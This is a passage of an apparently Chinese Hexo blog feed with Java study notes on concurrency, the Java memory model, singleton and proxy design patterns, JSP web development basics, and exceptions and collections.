title="死锁、活锁与饥饿"></a>死锁、活锁与饥饿</h2><p>死锁：指两个或两个以上的进程（或线程）在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将<strong>无法推进下去</strong>。此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。</p><p>活锁：是指线程1可以使用资源，但它很礼貌，让其他线程先使用资源，线程2也可以使用资源，但它很绅士，也让其他线程先使用资源。<strong>这样你让我，我让你，最后两个线程都无法使用资源。</strong></p><p>饥饿：通常因为<strong>线程优先级使用不当</strong>。是指如果线程T1占用了资源R，线程T2又请求封锁R，于是T2等待。T3也请求资源R，当T1释放了R上的封锁后，系统首先批准了T3的请求，T2仍然等待。然后T4又请求封锁R，当T3释放了R上的封锁之后，系统又批准了T4的请求……，<strong>T2可能永远等待</strong>。</p><h1 id="java内存模型"><a href="#java内存模型" class="headerlink" title="java内存模型"></a>java内存模型</h1><p><em>注意：没有什么jvm内存模型，要么是Jvm运行时数据区，要么是Java内存模型.</em></p><p>由来</p><p>计算机采用<strong>结构化</strong>的存储，而存储设备与处理器的运算有几个数量级的差距，所以不得不加入一层读写速度尽可能接近处理器运算速度的<strong>高速缓存</strong>，来作为内存和处理器之间的缓存，将运算所需要用到的数据复制到缓存中，让运算能快速进行，当运算结束后再从缓存同步回忆内存之中。这也引起了一个新的问题，<strong>缓存一致性</strong>。<br>除此之外，处理器可能会对输入代码进行乱序执行优化，因此如果一个计算任务依赖另一个计算任务的中间结果，那么其顺序并不能靠代码的先后顺序来保证。</p><p><em>插一句题外话，可不可计算机全部用内存，这样就不用考虑缓存一致性了？可以，比如说谷歌公司，他的搜索引擎的数据80%存在内存里面的，才会这么快。一般的小公司如果没有钱买这么大的内存是没办法跟他做竞争的。</em><br>那么至于Java的内存模型有什么关联呢？Java的内存模型中。主内存可以类比硬件的主内存，而每条线程的工作内存可以类比处理器高速缓存类。<br>这个变量是在修改后同步回主内存，在变量读取前从主内存刷新回变量值，这种以主内存作为传播媒介的方式来实现可见性的。<br>对一个变量执行，mx操作之前，必须把此变量同步回族内存中，一个变量在同一时刻只允许有一条进程对其进行加锁操作。</p>]]></content>
      
      
      <categories>
          
          <category> 并发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>单例模式</title>
      <link href="/2019/01/21/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
      <url>/2019/01/21/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="单例模式的三要素"><a href="#单例模式的三要素" class="headerlink" title="单例模式的三要素"></a>单例模式的三要素</h1><ol><li>构造方法私有化</li><li>静态属性修饰的实例</li><li>public static的 getInstance方法，返回第二步实例引用</li></ol><h1 id="单例模式的四种写法"><a href="#单例模式的四种写法" class="headerlink" title="单例模式的四种写法"></a>单例模式的四种写法</h1><h2 id="饿汉单例模式"><a href="#饿汉单例模式" class="headerlink" title="饿汉单例模式"></a>饿汉单例模式</h2><p>先创建一个实例等着调用<br><figure class="highlight plain"><figcaption><span>class GiantDragon &#123;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    //私有化构造方法使得该类无法在外部通过new 进行实例化</span><br><span class="line">    private GiantDragon()&#123;  &#125;</span><br><span class="line"> </span><br><span class="line">    //准备一个类属性，指向一个实例化对象。 因为是类属性，只有一个并且不需要实例即可使用</span><br><span class="line">    private static GiantDragon instance = new GiantDragon();</span><br><span class="line">     </span><br><span class="line">    //public static 方法，提供给调用者获取12行定义的对象</span><br><span class="line">    public static GiantDragon getInstance()&#123;</span><br><span class="line">        return instance;&#125;</span><br><span class="line">       public static void main(String[] args) &#123;</span><br><span class="line">            GiantDragon g1 = GiantDragon.getInstance();</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>优点：1.线程安全<br>缺点1.可能造成浪费，无论是否会用到这个对象，都会加载。<br>2.还有一个漏洞，别人可以通过反射的方式创建一个新对象。</p><h2 id="懒汉单例模式"><a href="#懒汉单例模式" class="headerlink" title="懒汉单例模式"></a>懒汉单例模式</h2><p>只有在调用getInstance的时候，才会创建实例。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class GiantDragon &#123;</span><br><span class="line">    //私有化构造方法使得该类无法在外部通过new 进行实例化</span><br><span class="line">    private GiantDragon()&#123;       </span><br><span class="line">    &#125;</span><br><span class="line">      //准备一个类属性，用于指向一个实例化对象，但是暂时指向null</span><br><span class="line">    private static GiantDragon instance;</span><br><span class="line">     </span><br><span class="line">    //public static 方法，返回实例对象</span><br><span class="line">    public static GiantDragon getInstance()&#123;</span><br><span class="line">        //第一次访问的时候，发现instance没有指向任何对象，这时实例化一个对象</span><br><span class="line">        if(null==instance)&#123;</span><br><span class="line">            instance = new GiantDragon();</span><br><span class="line">        &#125;</span><br><span class="line">        //返回 instance指向的对象</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>注意这样写是线程不安全的！</strong><br>问题出在直接“if(null==instance){”判断实例为null，就创建对象。<br>为什么说是线程不安全的呢。请模拟一下两个线程同时来创建对象结果会发生什么？<br>如果两个对象同时判断为空，结果就会创造了两个实例，就不是单例模式啦。<br>因此加入<strong>synchronized声明</strong>。<br>但如果判断语句写在同步代码后面，导致同步块包括了判断语句，这并没有必要，最重要的是很影响速度。（代码如下）<br><code>synchronized (Singleton.class) {            if (instance == null) {</code><br>如果在同步代码写在判断语句前面，可能会出现两个线程同时判断都为空，才进入同步块，线程1创建完一个对象后，线程2还会创造一个对象，只是两个线程创建对象不是同时发生而已，并没有解决线程不安全问题（代码如下）<br><code>if (instance == null) {            synchronized (Singleton.class){</code><br>重点来了，可以用<strong>双重检测机制</strong>，即在synchronized声明前后都判断一次是否为空，保证线程安全。<br>如果没有第一个判断：所有调用这个方法的线程都得先获取锁，不管此时实例是否为空，有没有必要。<br>如果没有第二个判断：如果两个线程同时判断为空，一个先取锁，一个后取锁。还是会创建两个对象，只不过是一个先一个后。第二个判断避免了两个线程<strong> 同时判断为空 </strong>先后获取锁创建对象的情况.线程1创建完实例后，线程2再执行的时候要经过第二次判断，此时已经有实例了，线程2就不满足创建条件。<br>双重检测机制不会影响效率。因为在第一次判断语句不是在同步块内，并没有影响多少效率。<br>第二次判断虽然在同步块内，但只有当实例为空的时候需要获取锁。</p><p>另外，实例是非原子性的，有可能出现<strong>指令重排问题</strong>，因此实例用<strong>volatile</strong>修饰。<br><figure class="highlight plain"><figcaption><span>class Singleton &#123;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private static volatile Singleton instance = null;</span><br><span class="line">private Singleton()&#123;&#125;;</span><br><span class="line"></span><br><span class="line">public static Singleton getInstance() &#123;</span><br><span class="line">    if (instance == null) &#123;</span><br><span class="line">        synchronized (Singleton.class)&#123;</span><br><span class="line">            if (instance == null) &#123;</span><br><span class="line">                instance = new Singleton();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return instance; &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>懒汉式优点：相对于饿汉模式；来说在启动的时候，会感觉到比饿汉式略快，因为并没有做对象的实例化。 但是在第一次调用的时候，会进行实例化操作，感觉上就略慢。<br>懒汉式缺点：1.麻烦，需要我们来自己加锁，保证线程安全的问题。<br>2.还是可以通过反射的方式来破坏单例模式。</p><h2 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Singleton3 &#123;</span><br><span class="line">    //静态内部类</span><br><span class="line">    private static class LazyHolder&#123;</span><br><span class="line">        private static Singleton3 instance = new Singleton3();</span><br><span class="line">    &#125;</span><br><span class="line">    //私有构造器</span><br><span class="line">    private Singleton3()&#123;&#125;;</span><br><span class="line">    public static Singleton3 getInstance() &#123;</span><br><span class="line">        return LazyHolder.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<strong>外部类无法访问静态内部类</strong>，因此只有当外部类调用Singleton.getInstance()方法的时候，才能得到instance实例。并且，instance实例对象初始化的时机并不是在Singleton被加载的时候，而是当getInstance()方法被调用的时候，静态内部类才会被加载，这时instance对象才会被初始化。并且也是线程安全的。所以，与饿汉式相比，通过静态内部类的方式，可以保证instance实例对象不会被白白浪费。但是，它仍然存在反射问题。<br>优点：1.线程安全<br>2.不会浪费<br>缺点：还是反射问题</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class SingletonTest &#123;</span><br><span class="line"></span><br><span class="line">    private SingletonTest()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * 枚举类型是线程安全的，并且只会装载一次</span><br><span class="line">     */</span><br><span class="line">    private enum Singleton&#123;</span><br><span class="line">        INSTANCE;</span><br><span class="line"></span><br><span class="line">        private final SingletonTest instance;</span><br><span class="line"></span><br><span class="line">        Singleton()&#123;</span><br><span class="line">            instance = new SingletonTest();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private SingletonTest getInstance()&#123;</span><br><span class="line">            return instance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static SingletonTest getInstance()&#123;</span><br><span class="line">        return SingletonTest.Singleton.INSTANCE.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>枚举方式优点：1.线程安全<br>2.代码简单<br>3.反射也不能获得多个对象，因为JVM能阻止反射获取枚举类的私有构造器<br>枚举方式缺点：和饿汉式一样，由于一开始instance实例就被创建了，所以有可能出现白白浪费的情况。</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代理模式</title>
      <link href="/2019/01/20/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/"/>
      <url>/2019/01/20/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h1><blockquote><p>一个场景设定，假设你要结婚了，但你不会为了结婚就要学婚礼布置，拍婚纱照等技术活，这些可以交给婚庆公司做嘛。于是你找了婚庆公司作为你的代理为了做一些准备工作。但最后去结婚的是你而不婚庆公司。这就是代理模式了。</p></blockquote><h2 id="静态代理有三个元素：共同接口、代理对象、目标对象。"><a href="#静态代理有三个元素：共同接口、代理对象、目标对象。" class="headerlink" title="静态代理有三个元素：共同接口、代理对象、目标对象。"></a>静态代理有三个元素：共同接口、代理对象、目标对象。</h2><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>接口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface Marry &#123;</span><br><span class="line">    void marry();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>代理类，把接口当做参数传入构造函数中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class MarryCompany implements Marry &#123;</span><br><span class="line">    Marry marry;</span><br><span class="line"></span><br><span class="line">    public MarryCompany(Marry marry) &#123;</span><br><span class="line">        this.marry = marry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void proWwork() &#123;</span><br><span class="line">        System.out.println(&quot;婚礼前准备&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void afterWwork() &#123;</span><br><span class="line">        System.out.println(&quot;婚礼后收拾&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void marry() &#123;</span><br><span class="line">        proWwork();</span><br><span class="line">        marry.marry();</span><br><span class="line">        afterWwork();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>目标对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class You implements Marry&#123;</span><br><span class="line">    public void marry()&#123;</span><br><span class="line">        System.out.println(&quot;我结婚了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Marry marry=new MarryCompany(new You());</span><br><span class="line">        marry.marry();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><u>静态代理不实现接口也能做到，为什么还要实现共同接口？</u>接口的作用是保证了代理对象具有和被代理对象具有一样的契约。<br>“代理”是针对相同的接口编程，以达到透明地替换原来的对象。如果添加一个不相干新的类去做这件事，这叫委托模式了。</p><h2 id="静态代理总结"><a href="#静态代理总结" class="headerlink" title="静态代理总结:"></a>静态代理总结:</h2><p>优点：可以做到在不修改目标对象的功能前提下,对目标功能扩展.<br>缺点:因为代理对象需要与目标对象实现一样的接口,所以会有很多代理类,类太多.同时,一旦接口增加方法,目标对象与代理对象都要维护。此时动态代理闪亮登场！</p><h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p>在动态代理中我们不再需要再手动的创建代理类，我们只需要编写一个动态处理器就可以了。真正的代理对象由JDK再运行时为我们动态的来创建。<br>比如这次不是我结婚了，而是我的宠物猫jack和rose要举行婚礼</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><p>待完善</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《java web开发与应用》笔记</title>
      <link href="/2018/12/17/%E3%80%8Ajava%20web%E5%BC%80%E5%8F%91%E4%B8%8E%E5%BA%94%E7%94%A8%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/12/17/%E3%80%8Ajava%20web%E5%BC%80%E5%8F%91%E4%B8%8E%E5%BA%94%E7%94%A8%E3%80%8B%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="从C-S从到B-S"><a href="#从C-S从到B-S" class="headerlink" title="从C/S从到B/S"></a>从C/S从到B/S</h1><p>C/S即客户机/服务器，比如qq电脑版。B/S即浏览器/服务器，比如京东网页版。<br>◆问:C/S有哪些不足?<br>答:qq客户端有丰富的功能,网络上传递的一般只是数据本身,客户端收到数据之后,负责处理这些数据并进行显示。不过如果qq更新了一个钱包功能,必须通知客户端更新，就是我们平时经常跳出的更新提示。<br>◆问:如何解决这个间题?<br>解决办法实际上很简单:让界面的显示效果在服务器端生成,传给客户端;服务器传什么,客户端就显示什么,客户端不要参与太多数据处理。这样,管理员如果想内容修改了,也不需要通知客户端升级,客户端只需要安装负责显示的软件（浏览器）,就可以了。<br>◆问:如何实现?<br>B/S模式。也分为客户机和服务器两层,但是客户机上不用安装软件,只需要使用浏览器即可,网络上传输的也不再是普通数据,而是将这些数据用HTML等技术进行处理之后的结果。<br>而Web网站最基本的要求是:必须使客户能够通过HTTP访问网站中的网页。比如,输人<a href="http://www.google.com,可以打开Google页面,说明Google就是Web网站。" target="_blank" rel="noopener">http://www.google.com,可以打开Google页面,说明Google就是Web网站。</a><br>怎样让用户能通过HTTP访问网页呢?很简单,只需将网页放在服务器中运行。当然,此处所讲的服务器是软件服务器（比如Tomcat）,不是硬件服务器。</p><p>Cookie原理<br>Cookie翻译成中文是“小甜饼”的意思,它能够使客户在登录过程中摆脱烦琐的输入账号和密码的过程。 Cookie的原理如下<br>(1)当用户登录成功后,服务器将其登录信息(如账号、密码)保存在客户端硬盘上的一个小文件内。<br>(2)下次用户访问该网站,浏览器读取该小文件(即 Cookie)中的信息(如账号、密码)传给服务器。<br>(3)服务器对这些信息进行验证,如果验证通过,跳转到登录成功的页面。<br>注意：cookie是保存在客户端。并且下次登录不需要输入账号、密码,并不代表账号、密码不需要在服务器端验证。</p><h1 id="MVC思想"><a href="#MVC思想" class="headerlink" title="MVC思想"></a>MVC思想</h1><p>想象一下，你用jsp为学校做好了一个学校教务系统。<br>有一天，学校突然决定,选课表单显示应该更美观一些,要改变显示方法。<br>由于计算机犯罪越来越多,要求在验证信息的时候多一些功能,如安全密钥等。<br>数据库迁移,数据库变成了不同的名字,表结构也改变了,查询时需要修改代码。<br>要解决这些问题,就必须把JSP的某一部分改掉。但是,编写代码时最忌讳的就是在很长的一段程序中修改很小的一部分,这样做代价很高,并且在开发过程中分工也很不方便。如:因此,该方案中,将页面设计和商业逻辑混合在一起,在修改时必须读懂所有代码。从网页编写者的角度讲，希望看到的是大量的标签而不是java。而编程人员也需要知道数据库的结构。美工人员修改显示方法时,需要面对大量数据库访问代码。，开发时bu便于分工。<br>基于该问题,可以将该JSP拆成三个模块来实现。<br>首先,编写JSP,负责输入查询代码,提交到 Servlet,。Servlet进行安全验证,调用DAO来访问数据库,得到结果,跳转到JSP显示这种方法。<br>虽然前期设计比较复杂,但有如下特点<br>1、适合分工,每一个程序员只需要关心他自己所需要关心的那个模块。<br>2、维护方便,比如需要修改其中的一个部分,就对相应的模块进行修改就可以了。<br>对比这两种方案,可以发现,第二种方案把程序分为不同的模块,显示、业务逻辑、过程控制都独立起来,使得软件在可伸缩性和可维护性方面有了很大的优势。如要改变外观显示,只需要修改JSP就可以了;修改验证方法,只需要修改 Servlet就可以了;数据库迁移,只需要修改DAO就可以了。这种思想就是MVC思想。</p><h1 id="获取单选、双选、下拉菜单数据"><a href="#获取单选、双选、下拉菜单数据" class="headerlink" title="获取单选、双选、下拉菜单数据"></a>获取单选、双选、下拉菜单数据</h1><h2 id="单选"><a href="#单选" class="headerlink" title="单选"></a>单选</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">性别：</span><br><span class="line">男 &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;boy&quot; &gt;</span><br><span class="line">女&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;girl&quot;&gt;</span><br></pre></td></tr></table></figure><p>获取数据代码略</p><h2 id="多选"><a href="#多选" class="headerlink" title="多选"></a>多选</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">唱歌&lt;input name=&quot;fav&quot; type=&quot;checkbox&quot; value=&quot;singing&quot;&gt;</span><br><span class="line">跳舞&lt;input name=&quot;fav&quot; type=&quot;checkbox&quot; value=&quot;dance&quot;&gt;</span><br><span class="line">打球&lt;input name=&quot;fav&quot; type=&quot;checkbox&quot; value=&quot;ball&quot;&gt;</span><br><span class="line">打游戏&lt;input name=&quot;fav&quot; type=&quot;checkbox&quot; value=&quot;game&quot;&gt;</span><br><span class="line">//注意4个多选input的name都为“fav”</span><br><span class="line">获取数据代码:</span><br><span class="line">&lt;%String [] fav=request.getParameterValues(&quot;fav&quot;);</span><br><span class="line">for (String s : fav) &#123;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%=s%&gt;</span><br><span class="line">&lt;% &#125;%&gt;</span><br></pre></td></tr></table></figure><h2 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select name=&quot;home&quot;&gt;</span><br><span class="line">&lt;option value=&quot;beijing&quot;&gt;北京&lt;/option&gt;</span><br><span class="line">&lt;option value=&quot;&quot;&gt;上海&lt;/option&gt;</span><br><span class="line">&lt;option value=&quot;&quot;&gt;广州&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><p>获取数据代码略</p><h1 id="jsp有些功能用-JavaScript也能够实现-那有何区别"><a href="#jsp有些功能用-JavaScript也能够实现-那有何区别" class="headerlink" title="jsp有些功能用 JavaScript也能够实现,那有何区别?"></a>jsp有些功能用 JavaScript也能够实现,那有何区别?</h1><p>答:最大的区别是, Java Script源代码是被服务器发送到客户端,由客户端执行,因此,客户端可以看到 JavaScript源代码;而Java代码却不会。你在开发者工具查看代码是看不到jsp页面中的Java代码的。</p><h1 id="为什么需要url传值？"><a href="#为什么需要url传值？" class="headerlink" title="为什么需要url传值？"></a>为什么需要url传值？</h1><p>比如教务系统中，每个学生信息后面的删除按钮。点击之后会跳转到删除操作页面。但如何知道要删除哪个学生呢？这就需要在url跳转的时候顺便把要删除的学生学号传过去。当然，也可以传给本页面。<br><a href="delete.jsp?sno=1">删除</a><br><a href="delete.jsp?sno=2">删除</a><br>再比如说，让你写一个页面，上有10个链接，分别是1 2 3 4 5 6 7 8 9 10，单击相应的链接，在底部打印相应的乘法表。如点击4打印四四乘法表。url传值就派上用场了。<br>如果传值是中文会出现乱码问题，传值和取值支付URLEncoder.encode()和URLEncoder.decode()分别进行编码和解码</p><h1 id="为什么需要include指令？"><a href="#为什么需要include指令？" class="headerlink" title="为什么需要include指令？"></a>为什么需要include指令？</h1><p>比如版权信息，你不可能每个页面每个页面的复制吧，如果有变动岂不是每个都要改？</p><h1 id="include指令和include动作的区别"><a href="#include指令和include动作的区别" class="headerlink" title="include指令和include动作的区别"></a>include指令和include动作的区别</h1><p>&lt;%@include file=”info.jsp”%&gt;include指令不会实时更新<br>&lt;jsp:include page=”info.jsp” /&gt;include动作会实时更新<br>include指令在JSP编译时就将对应的文件包含进来。而 include动作则不同,其会在客户端对JSP文件发出请求的时候将对应包含文件的输出包含进来。include动作还会自动检查被包含文件的变化。也就是说,当被包含资源的内容发生<br>变化的时候,使用 include指令的话,服务器可能不会检测到,所以不会对其进行重新的编译,这给维护带来了巨大的麻烦。include动作则可以在每次客户端发出请求时重新把资源包含进来,进行实时的更新。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>URL传值会在浏览器的地址栏中看到传递的信息;<br>隐藏表单会在客户端页面的源代码中看到传递的信息;<br>Cookie会在客户端页面的文本文件中看到传递的信息。</p><p>检查用户提交的信息是否为空，可以用javascript实现。比如验证是否包含非法字符%，只要客户端检查输入就好了。<br>问：那如何检查用户<strong>所有</strong>输入是否有非法字符？<br>答：用循环获得所有表单数据。</p><p>jsp内置对象是自动载入的，因此它们不需要直接实例化。</p><p>请求服务器的端口号的方法，可以做类似“检查IP以220开头的用户是非法用户”的事情。</p><p>web.xml可以设置欢迎页<welcome-file-list></welcome-file-list></p><p>servlet为了实现控制者这一角色，必须要能够实现跳转。</p><p>过滤器可以判断用户类型，管理员、普通用户。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>javaSE（下）</title>
      <link href="/2018/10/10/javaSE%E4%B8%8B/"/>
      <url>/2018/10/10/javaSE%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h1><h2 id="当finally中有返回语句"><a href="#当finally中有返回语句" class="headerlink" title="当finally中有返回语句"></a>当finally中有返回语句</h2><p>当try和finally中都有有返回语句会执行哪一个？<br>请看下面代码，猜猜程序的运行结果是？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static int testFinally() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125; catch (Exception ex) &#123;</span><br><span class="line">            return 2;</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            System.out.println(&quot;execute finally&quot;);</span><br><span class="line">            return 3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int result = testFinally();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序在执行try中遇到return语句时，会先将返回值储存到一个指定位置，然后执行finally代码块。（除非碰到exit(0)函数，就直接结束不执行finally）<br>如果finally里面有返回语句将会覆盖其它返回语句，最终执行finally的return语句，储存中的return语句被回收。<br>如果finally 没有返回语句，则执行完finally按储存中的return来。<br>因此运行结果是:execute finally 3</p><h2 id="常见的runtime-exception-运行时异常-："><a href="#常见的runtime-exception-运行时异常-：" class="headerlink" title="常见的runtime exception(运行时异常)："></a>常见的runtime exception(运行时异常)：</h2><p>(不是必须进行try catch的异常 )<br>NullPointerException 空指针异常<br>ArithmeticException 算术异常，比如除数为零<br>ClassCastException 类型转换异常<br>ConcurrentModificationException 同步修改异常，遍历一个集合的时候，删除集合的元素，就会抛出该异常<br>IndexOutOfBoundsException 数组下标越界异常<br>NegativeArraySizeException 为数组分配的空间是负数异常</p><h2 id="throw和throws的区别"><a href="#throw和throws的区别" class="headerlink" title="throw和throws的区别"></a>throw和throws的区别</h2><p>举个栗子<br>throw是语句抛出一个异常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String s = &quot;abc&quot;; </span><br><span class="line">if(s.equals(&quot;abc&quot;)) &#123; </span><br><span class="line">  throw new NumberFormatException(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>throws是方法可能抛出异常的声明<br><code>public static void function() throws NumberFormatException{</code></p><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><ul><li>Java容器类类库的用途是”保存对象”，并将其划分为两个不同的概念：<br>1) Collection<br>一组”对立”的元素，通常这些元素都服从某种规则<br>　　1.1) List必须保持元素特定的顺序<br>　　1.2) Set不能有重复元素<br>　　1.3) Queue保持一个队列(先进先出)的顺序<br>2) Map<br>一组成对的”键值对”对象</li></ul><ul><li>Collection与Collections<br>Collection是所有集合类的根接口；<br>Collections是提供集合操作的工具类；常用方法如下<br>reverse    